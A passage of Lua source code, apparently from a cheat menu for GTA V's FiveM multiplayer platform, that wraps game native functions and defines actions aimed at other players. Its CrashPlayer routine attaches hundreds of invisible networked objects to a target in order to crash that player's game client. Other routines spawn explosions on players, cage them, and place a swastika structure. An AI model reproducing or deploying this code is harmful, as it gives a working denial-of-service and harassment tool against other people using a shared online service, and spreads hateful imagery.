                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPedWeaponReadyToShoot"] = {

            hash = 0xB80CA294F2F26749,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetPedComponentVariation"] = {

            hash = 0x262B14F48D29DE80

        },

        ["GetEntityHealth"] = {

            hash = 0xEEF059FAD016D209,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetAmmoInPedWeapon"] = {

            hash = 0x015A522136D7F951,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], args[3], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetMaxAmmo"] = {

            hash = 0xDC16122C7A20C933,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], picho.Citizen.PointerValueIntInitialized(args[3]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetAmmoInPedWeapon"] = {

            hash = 0x015A522136D7F951,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], args[3], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetPedPropIndex"] = {

            hash = 0x898CC20EA75BACD8,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetPedPropTextureIndex"] = {

            hash = 0xE131A28626F81AB2,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetPedDrawableVariation"] = {

            hash = 0x67F3780DD425D4FC,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetPedTextureVariation"] = {

            hash = 0x04A355E041E004E6,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetPedPaletteVariation"] = {

            hash = 0xE3DD5F2A84B42281,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["SetPedPropIndex"] = {

            hash = 0x93376B65A266EB5F

        },

        ["SetPedAmmo"] = {

            hash = 0x14E56BC5B5DB6A19

        },

        ["SetAmmoInClip"] = {

            hash = 0xDCD2A934D65CB497,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], args[3], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetDisabledControlNormal"] = {

            hash = 0x11E65974A982637C,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsFloat()

            end

        },

        ["TaskLookAtEntity"] = {

            hash = 0x69F4BE8C8CC4796C

        },

        ["PointCamAtEntity"] = {

            hash = 0x5640BFF86B16E8DC

        }

    }



    local _bad = {}

    local _empty = function() end



    local bad = function(...)

        if not _bad[picho.tostring(...)] then

            PCCT:Print("[NATIVE] Invalid GetFunction call: ^1" .. picho.tostring(...) .. "^7")

            _bad[picho.tostring(...)] = true

        end



        return _empty

    end



    function PCCT:GetFunction(name)

        if not _natives[name] then return bad(name) end



        if _natives[name].func then

            return _natives[name].func

        elseif _natives[name].hash then

            _natives[name].func = function(...)

                local args = {...}

                local data = _natives[name]

                local hash = data.hash



                if data.unpack then

                    if data.return_as then return data.return_as(picho.Citizen.IN(hash, data.unpack(args))) end



                    return picho.Citizen.IN(hash, data.unpack(args))

                else

                    if data.return_as then return data.return_as(picho.Citizen.IN(hash, picho.table.unpack(args))) end



                    return picho.Citizen.IN(hash, picho.table.unpack(args))

                end

            end



            return _natives[name].func

        end

    end



    PCCT.DuiName = math.ceil(math.random(100, 5000)) .. "_" .. PCCT:GetFunction("GetGameTimer")() .. "_" .. PCCT.Build



    PCCT.Keys = {

        ["ESC"] = 322,

        ["F1"] = 288,

        ["F2"] = 289,

        ["F3"] = 170,

        ["F5"] = 166,

        ["F6"] = 167,

        ["F7"] = 168,

        ["F8"] = 169,

        ["F9"] = 56,

        ["F10"] = 57,

        ["~"] = 243,

        ["1"] = 157,

        ["2"] = 158,

        ["3"] = 160,

        ["4"] = 164,

        ["5"] = 165,

        ["6"] = 159,

        ["7"] = 161,

        ["8"] = 162,

        ["9"] = 163,

        ["-"] = 84,

        ["="] = 83,

        ["BACKSPACE"] = 177,

        ["TAB"] = 37,

        ["Q"] = 44,

        ["W"] = 32,

        ["E"] = 38,

        ["R"] = 45,

        ["T"] = 245,

        ["Y"] = 246,

        ["U"] = 303,

        ["P"] = 199,

        ["["] = 39,

        ["]"] = 40,

        ["ENTER"] = 18,

        ["CAPS"] = 137,

        ["A"] = 34,

        ["S"] = 8,

        ["D"] = 9,

        ["F"] = 23,

        ["G"] = 47,

        ["H"] = 74,

        ["K"] = 311,

        ["L"] = 182,

        ["LEFTSHIFT"] = 21,

        ["Z"] = 20,

        ["X"] = 73,

        ["C"] = 26,

        ["V"] = 0,

        ["B"] = 29,

        ["N"] = 249,

        ["M"] = 244,

        [","] = 82,

        ["."] = 81,

        ["LEFTCTRL"] = 36,

        ["LEFTALT"] = 19,

        ["SPACE"] = 22,

        ["RIGHTCTRL"] = 70,

        ["HOME"] = 213,

        ["PAGEUP"] = 10,

        ["PAGEDOWN"] = 11,

        ["DELETE"] = 178,

        ["LEFT"] = 174,

        ["RIGHT"] = 175,

        ["UP"] = 172,

        ["DOWN"] = 173,

        ["NENTER"] = 201,

        ["MWHEELUP"] = 15,

        ["MWHEELDOWN"] = 14,

        ["N4"] = 108,

        ["N5"] = 60,

        ["N6"] = 107,

        ["N+"] = 96,

        ["N-"] = 97,

        ["N7"] = 117,

        ["N8"] = 61,

        ["N9"] = 118,

        ["MOUSE1"] = 24,

        ["MOUSE2"] = 25,

        ["MOUSE3"] = 348

    }



    local all_weapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_RAYPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}

    local all_weapons_hashes = {}



    local give_weapon_list = {

        {

            Name = "Melee",

            Weapons = {"WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_FLARE", "WEAPON_SMOKEGRENADE", "WEAPON_GRENADE", "WEAPON_BALL", "WEAPON_FIREEXTINGUISHER", "WEAPON_MOLOTOV", "WEAPON_SNOWBALL", "WEAPON_PETROLCAN"}

        },

        {

            Name = "Pistolas",

            Weapons = {"WEAPON_RAYPISTOL", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MACHINEPISTOL"}

        },

        {

            Name = "SMGs",

            Weapons = {"WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_MINISMG", "WEAPON_ASSAULTSMG", "WEAPON_MICROSMG", "WEAPON_COMBATPDW"}

        },

        {

            Name = "Rifles",

            Weapons = {"WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG", "WEAPON_ASSAULTSMG", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MUSKET"}

        },

        {

            Name = "Escopetas",

            Weapons = {"WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_PUMPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_BULLPUPSHOTGUN"}

        },

        {

            Name = "Snipers",

            Weapons = {"WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE"}

        },

        {

            Name = "Pesados",

            Weapons = {"WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_HOMINGLAUNCHER", "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_STINGER"}

        }

    }



    PCCT.Notifications = {}



    local function _clamp(val, min, max)

        if val < min then return min end

        if val > max then return max end



        return val

    end



    function PCCT:EquipOutfit(ped, data)

        SetPedPropIndex(ped, 0, data.hat, data.hat_texture, 1)

        SetPedPropIndex(ped, 1, data.glasses, data.glasses_texture, 1)

        SetPedPropIndex(ped, 2, data.ear, data.ear_texture, 1)

        SetPedPropIndex(ped, 6, data.watch, data.watch_texture, 1)

        SetPedPropIndex(ped, 7, data.wrist, data.wrist_texture, 1)

        SetPedComponentVariation(ped, 0, data.head.draw, data.head.texture, data.head.palette)

        SetPedComponentVariation(ped, 1, data.beard.draw, data.beard.texture, data.beard.palette)

        SetPedComponentVariation(ped, 2, data.hair.draw, data.hair.texture, data.hair.palette)

        SetPedComponentVariation(ped, 3, data.torso.draw, data.torso.texture, data.torso.palette)

        SetPedComponentVariation(ped, 4, data.legs.draw, data.legs.texture, data.legs.palette)

        SetPedComponentVariation(ped, 5, data.hands.draw, data.hands.texture, data.hands.palette)

        SetPedComponentVariation(ped, 6, data.feet.draw, data.feet.texture, data.feet.palette)

        SetPedComponentVariation(ped, 7, data.accessory_1.draw, data.accessory_1.texture, data.accessory_1.palette)

        SetPedComponentVariation(ped, 8, data.accessory_2.draw, data.accessory_2.texture, data.accessory_2.palette)

        SetPedComponentVariation(ped, 9, data.accessory_3.draw, data.accessory_3.texture, data.accessory_3.palette)

        SetPedComponentVariation(ped, 10, data.mask.draw, data.mask.texture, data.mask.palette)

        SetPedComponentVariation(ped, 11, data.auxillary.draw, data.auxillary.texture, data.auxillary.palette)

    end



    function PCCT:StealOutfit(ped, p_ped)

        self:EquipOutfit(ped, {

            hat = GetPedPropIndex(p_ped, 0),

            hat_texture = GetPedPropTextureIndex(p_ped, 0),

            glasses = GetPedPropIndex(p_ped, 1),

            glasses_texture = GetPedPropTextureIndex(p_ped, 1),

            ear = GetPedPropIndex(p_ped, 2),

            ear_texture = GetPedPropTextureIndex(p_ped, 2),

            watch = GetPedPropIndex(p_ped, 6),

            watch_texture = GetPedPropTextureIndex(p_ped, 6),

            wrist = GetPedPropIndex(p_ped, 7),

            wrist_texture = GetPedPropTextureIndex(p_ped, 7),

            head = {

                draw = GetPedDrawableVariation(p_ped, 0),

                texture = GetPedTextureVariation(p_ped, 0),

                palette = GetPedPaletteVariation(p_ped, 0)

            },

            beard = {

                draw = GetPedDrawableVariation(p_ped, 1),

                texture = GetPedTextureVariation(p_ped, 1),

                palette = GetPedPaletteVariation(p_ped, 1)

            },

            hair = {

                draw = GetPedDrawableVariation(p_ped, 2),

                texture = GetPedTextureVariation(p_ped, 2),

                palette = GetPedPaletteVariation(p_ped, 2)

            },

            torso = {

                draw = GetPedDrawableVariation(p_ped, 3),

                texture = GetPedTextureVariation(p_ped, 3),

                palette = GetPedPaletteVariation(p_ped, 3)

            },

            legs = {

                draw = GetPedDrawableVariation(p_ped, 4),

                texture = GetPedTextureVariation(p_ped, 4),

                palette = GetPedPaletteVariation(p_ped, 4)

            },

            hands = {

                draw = GetPedDrawableVariation(p_ped, 5),

                texture = GetPedTextureVariation(p_ped, 5),

                palette = GetPedPaletteVariation(p_ped, 5)

            },

            feet = {

                draw = GetPedDrawableVariation(p_ped, 6),

                texture = GetPedTextureVariation(p_ped, 6),

                palette = GetPedPaletteVariation(p_ped, 6)

            },

            accessory_1 = {

                draw = GetPedDrawableVariation(p_ped, 7),

                texture = GetPedTextureVariation(p_ped, 7),

                palette = GetPedPaletteVariation(p_ped, 7)

            },

            accessory_2 = {

                draw = GetPedDrawableVariation(p_ped, 8),

                texture = GetPedTextureVariation(p_ped, 8),

                palette = GetPedPaletteVariation(p_ped, 8)

            },

            accessory_3 = {

                draw = GetPedDrawableVariation(p_ped, 9),

                texture = GetPedTextureVariation(p_ped, 9),

                palette = GetPedPaletteVariation(p_ped, 9)

            },

            mask = {

                draw = GetPedDrawableVariation(p_ped, 10),

                texture = GetPedTextureVariation(p_ped, 10),

                palette = GetPedPaletteVariation(p_ped, 10)

            },

            auxillary = {

                draw = GetPedDrawableVariation(p_ped, 11),

                texture = GetPedTextureVariation(p_ped, 11),

                palette = GetPedPaletteVariation(p_ped, 11)

            }

        })

    end



    function PCCT:RequestModelSync(model, timeout)

        timeout = timeout or 2500

        local counter = 0

        self:GetFunction("RequestModel")(model)



        while not self:GetFunction("HasModelLoaded")(model) do

            self:GetFunction("RequestModel")(model)

            counter = counter + 100

            Wait(100)

            if counter >= timeout then return false end

        end



        return true

    end



    function PCCT.Util:ValidPlayer(src)

        if not src then return false end



        return PCCT:GetFunction("GetPlayerServerId")(src) ~= nil and PCCT:GetFunction("GetPlayerServerId")(src) > 0

    end



    function PCCT:SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)

        CreateThread(function()

            local speed = 0

            local rpm = 0



            if self:GetFunction("IsModelValid")(modelName) and self:GetFunction("IsModelAVehicle")(modelName) then

                self:GetFunction("RequestModel")(modelName)



                while not self:GetFunction("HasModelLoaded")(modelName) do

                    Wait(0)

                end



                if replaceCurrent and self:GetFunction("IsPedInAnyVehicle")(self.LocalPlayer) then

                    self.Util:DeleteEntity(self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer))

                end



                local pos = (spawnInside and self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0) or self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 4.0, 0.0))

                local heading = self:GetFunction("GetEntityHeading")(self.LocalPlayer) + (spawnInside and 0 or 90)

                local vehicle = self:GetFunction("CreateVehicle")(self:GetFunction("GetHashKey")(modelName), pos.x, pos.y, pos.z, heading, true, false)

                self:GetFunction("SetPedIntoVehicle")(self.LocalPlayer, vehicle, -1)

                self:GetFunction("SetVehicleEngineOn")(vehicle, true, true)

                self:GetFunction("SetVehicleForwardSpeed")(vehicle, speed)

                self:GetFunction("SetVehicleCurrentRpm")(vehicle, rpm)

            end

        end)

    end



    function PCCT:GetTextInput(TextEntry, ExampleText, MaxStringLength)

        local _text_input = TextEntry .. " ~r~(NO PRESIONES ESC / BDM)"

        self:GetFunction("AddTextEntry")("FMMC_KEY_TIP1_MISC", _text_input)

        self:GetFunction("DisplayOnscreenKeyboard")(1, "FMMC_KEY_TIP1_MISC", "", picho.tostring(ExampleText), "", "", "", picho.tonumber(MaxStringLength) or 500)

        blockinput = true



        while self:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and self:GetFunction("UpdateOnscreenKeyboard")() ~= 2 do

            if self.Showing then

                self:DrawMenu()

            end



            Wait(0)

        end



        if self:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then

            if self.Showing then

                self:DrawMenu()

            end



            _text_input = nil

            local result = self:GetFunction("GetOnscreenKeyboardResult")()

            blockinput = false

            self:GetFunction("CancelOnscreenKeyboard")()



            return result

        else

            if self.Showing then

                self:DrawMenu()

            end



            _text_input = nil

            blockinput = false

            self:GetFunction("CancelOnscreenKeyboard")()



            return nil

        end

    end



    function PCCT.Util:DeleteEntity(entity)

        if not PCCT:GetFunction("DoesEntityExist")(entity) then return end

        PCCT:GetFunction("NetworkRequestControlOfEntity")(entity)

        PCCT:GetFunction("SetEntityAsMissionEntity")(entity, true, true)

        PCCT:GetFunction("DeletePed")(entity)

        PCCT:GetFunction("DeleteEntity")(entity)

        PCCT:GetFunction("DeleteObject")(entity)

        PCCT:GetFunction("DeleteVehicle")(entity)



        return true

    end



    local sounds = {

        ["INFO"] = {

            times = 3,

            name = "DELETE",

            picho = "HUD_DEATHMATCH_SOUNDSET"

        },

        ["EXITO"] = {

            times = 1,

            name = "Pin_Centred",

            picho = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"

        },

        ["AVISO"] = {

            times = 1,

            name = "Turn",

            picho = "DLC_HEIST_HACKING_SNAKE_SOUNDS"

        },

        ["ERROR"] = {

            times = 3,

            name = "Hack_Failed",

            picho = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"

        }

    }



    local last_sound = 0



    function PCCT:AddNotification(type, msg, timeout)

        timeout = timeout or 10000



        if self.Config.UseSounds and last_sound <= self:GetFunction("GetGameTimer")() then

            local sound = sounds[type] or {}



            for i = 1, sound.times or 1 do

                if sound.name and sound.picho then

                    self:GetFunction("PlaySoundFrontend")(-1, sound.name, sound.picho, false)

                end

            end



            last_sound = self:GetFunction("GetGameTimer")() + 200

        end



        for _, v in picho.ipairs(self.Notifications) do

            if (v.RawMsg or v.Message) == msg and not self.Notifications[_ + 1] then

                v.Count = (v.Count or 1) + 1

                v.RawMsg = v.RawMsg or v.Message

                v.Message = v.RawMsg .. " ~s~(x" .. v.Count .. ")"

                v.Duration = (timeout / 1000)

                v.Expires = self:GetFunction("GetGameTimer")() + timeout



                return

            end

        end



        local notification = {}

        notification.Type = type

        notification.Message = msg

        notification.Duration = timeout / 1000

        notification.Expires = self:GetFunction("GetGameTimer")() + timeout

        self.Notifications[#self.Notifications + 1] = notification

        self:Print("[Notification] [" .. type .. "]" .. ": " .. msg)

    end



    function PCCT:DoNetwork(obj)

        if not self:GetFunction("DoesEntityExist")(obj) then return end

        local id = self:GetFunction("ObjToNet")(obj)

        self:GetFunction("NetworkSetNetworkIdDynamic")(id, true)

        self:GetFunction("SetNetworkIdExistsOnAllMachines")(id, true)

        self:GetFunction("SetNetworkIdCanMigrate")(id, false)



        for _, src in picho.pairs(self.PlayerCache) do

            self:GetFunction("SetNetworkIdSyncToPlayer")(id, src, true)

        end

    end



    function PCCT:GasPlayer(player)

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            local ped = self:GetFunction("GetPlayerPed")(player)

            if not self:GetFunction("DoesEntityExist")(ped) then return end



            if self.Config.SafeMode then

                self:GetFunction("ClearPedTasksImmediately")(ped)

            end



            local dest = self:GetFunction("GetPedBoneCoords")(ped, self:GetFunction("GetPedBoneIndex")(ped, 0), 0.0, 0.0, 0.0, 0.0)

            local origin = self:GetFunction("GetPedBoneCoords")(ped, self:GetFunction("GetPedBoneIndex")(ped, 57005), 0.0, 0.0, 0.0, 0.0)



            for i = 1, 5 do

                self:GetFunction("AddExplosion")(origin.x + picho.math.random(-1, 1), origin.y + picho.math.random(-1, 1), origin.z - 1.0, 12, 100.0, true, false, 0.0)

                Wait(100)

            end



            local pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

            local fence_u = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)

            self:DoNetwork(fence_u)

            self:GetFunction("SetEntityRotation")(fence_u, 0.0, 0.0, 0.0)

            self:GetFunction("FreezeEntityPosition")(fence_u, true)

            Wait(100)

            local fence_r = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)

            self:DoNetwork(fence_r)

            self:GetFunction("SetEntityRotation")(fence_r, 0.0, 0.0, 90.0)

            self:GetFunction("FreezeEntityPosition")(fence_r, true)

            Wait(100)

            local fence_b = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y + 1.85, pos.z - 1.0, true, true, true)

            self:DoNetwork(fence_b)

            self:GetFunction("SetEntityRotation")(fence_b, 0.0, 0.0, 0.0)

            self:GetFunction("FreezeEntityPosition")(fence_b, true)

            local fence_l = self:GetFunction("CreateObject")(-759902142, pos.x + 1.35, pos.y - 1.0, pos.z - 1.0, true, true, true)

            self:DoNetwork(fence_l)

            self:GetFunction("SetEntityRotation")(fence_l, 0.0, 0.0, 90.0)

            self:GetFunction("FreezeEntityPosition")(fence_l, true)

            self.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ped, 10.0)

        end)

    end



    local __CitIn__ = Citizen



    function PCCT:TazePlayer(player)

        local ped = self:GetFunction("GetPlayerPed")(player)

        local destination = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)

        local origin = self:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)

        self:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, self:GetFunction("GetHashKey")("WEAPON_STUNGUN"), self.LocalPlayer, true, false, 24000.0)

    end



    function PCCT:HydrantPlayer(player)

        local ped = self:GetFunction("GetPlayerPed")(player)

        local origin = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)

        self:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 13, 100.0, (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) and false or true), false, 0.0)

    end



    function PCCT:FirePlayer(player)

        local ped = self:GetFunction("GetPlayerPed")(player)

        local origin = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)

        self:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 12, 100.0, (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) and false or true), false, 0.0)

    end



    local crash_model_list = {}

    local crash_models = {"hei_prop_carrier_cargo_02a", "p_cablecar_s", "p_ferris_car_01", "prop_cj_big_boat", "prop_rock_4_big2", "prop_steps_big_01", "v_ilev_lest_bigscreen", "prop_carcreeper", "apa_mp_h_bed_double_09", "apa_mp_h_bed_wide_05", "sanchez", "cargobob", "prop_cattlecrush", "prop_cs_documents_01"} --{"prop_ferris_car_01_lod1", "prop_construcionlamp_01", "prop_fncconstruc_01d", "prop_fncconstruc_02a", "p_dock_crane_cabl_s", "prop_dock_crane_01", "prop_dock_crane_02_cab", "prop_dock_float_1", "prop_dock_crane_lift", "apa_mp_h_bed_wide_05", "apa_mp_h_bed_double_08", "apa_mp_h_bed_double_09", "csx_seabed_bldr4_", "imp_prop_impexp_sofabed_01a", "apa_mp_h_yacht_bed_01"}



    CreateThread(function()

        PCCT:RequestModelSync(spike_model)

        local loaded = 0



        for i = 1, #crash_models do

            if PCCT:RequestModelSync(crash_models[i]) then

                loaded = loaded + 1

            end

        end



        for i = 1, #crash_models * 5 do

            for _ = 1, 2 do

                crash_models[#crash_models + 1] = crash_models[picho.math.random(1, #crash_models)]

                loaded = loaded + 1

            end

        end



        PCCT:Print("[MISC] Cargado " .. loaded .. " model(s).")

    end)



    local crash_loop

    local notified_crash = {}



    function PCCT:CrashPlayer(player, all, strict)

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end

        local ATT_LIMIT = 400

        local CUR_ATT_COUNT = 0



        CreateThread(function()

            local ped = self:GetFunction("GetPlayerPed")(player)

            local playerPos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

            local selfPos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)

            local dist = self:GetFunction("GetDistanceBetweenCoords")(playerPos.x, playerPos.y, playerPos.z, selfPos.x, selfPos.y, selfPos.z, true)



            if dist <= 500.0 then

                local safeX, safeY, safeZ = playerPos.x - picho.math.random(-1000, 1000), playerPos.y - picho.math.random(-1000, 1000), -200

                self:GetFunction("SetEntityCoords")(self.LocalPlayer, _clamp(safeX, -2000, 2000) + 0.0, _clamp(safeY, -2000, 2000) + 0.0, safeZ, false, false, false, false)

            end



            self:AddNotification("INFO", "Crashing " .. self:CleanName(self:GetFunction("GetPlayerName")(player)), 10000)

            local bad_obj



            for i = 1, ATT_LIMIT do

                if CUR_ATT_COUNT >= ATT_LIMIT or not self:GetFunction("DoesEntityExist")(ped) then break end

                local method = picho.math.random(1, 2)



                if strict == "object" then

                    method = 1

                elseif strict == "ped" then

                    method = 2

                end



                if method == 1 then

                    local model = crash_models[picho.math.random(1, #crash_models)]

                    local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, true, true, true)



                    if not self:GetFunction("DoesEntityExist")(obj) then

                        bad_obj = true



                        if not notified_crash[model] then

                            self:Print("[CRASH] Failed to load object ^3" .. model .. "^7")

                            notified_crash[model] = true

                        end

                    else

                        self:DoNetwork(obj)

                        self:GetFunction("AttachEntityToEntity")(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)

                        self:GetFunction("SetEntityVisible")(obj, false)

                        crash_model_list[obj] = true

                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1

                    end

                elseif method == 2 then

                    local model = self.FreeCam.SpawnerOptions.PED[picho.math.random(1, #self.FreeCam.SpawnerOptions.PED)]

                    local ent = self:GetFunction("CreatePed")(24, self:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, 0.0, true, true)



                    if self:GetFunction("DoesEntityExist")(ent) then

                        self:DoNetwork(ent)

                        self:GetFunction("AttachEntityToEntity")(ent, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, 1, false)

                        self:GetFunction("SetEntityVisible")(ent, false)

                        crash_model_list[ent] = true

                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1

                    end

                end



                Wait(0)

            end



            if bad_obj then

                self:AddNotification("ERROR", "Some crash models failed to load. See console for details.", 10000)

            end



            notified_crash = {}

            self:CleanupCrash(player, all)

        end)

    end



    function PCCT:CleanupCrash(player, all)

        CreateThread(function()

            if crash_loop ~= nil and not all then return end

            crash_loop = not all and player or nil



            if crash_loop and not self:GetFunction("DoesEntityExist")(crash_loop) then

                crash_loop = nil

            end



            local timeout = 0



            while (all and timeout <= 180000) or (self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(crash_loop)) and timeout <= 120000) do

                timeout = timeout + 100

                Wait(100)

            end



            while true do

                if not self.Enabled then return end



                for cobj, _ in picho.pairs(crash_model_list) do

                    if self:RequestControlSync(cobj) then

                        self:GetFunction("DeleteObject")(cobj)

                        self:GetFunction("DeleteEntity")(cobj)

                        crash_model_list[cobj] = nil

                    end

                end



                if #crash_model_list == 0 then

                    self:AddNotification("INFO", "Cleaned up crash objects.")
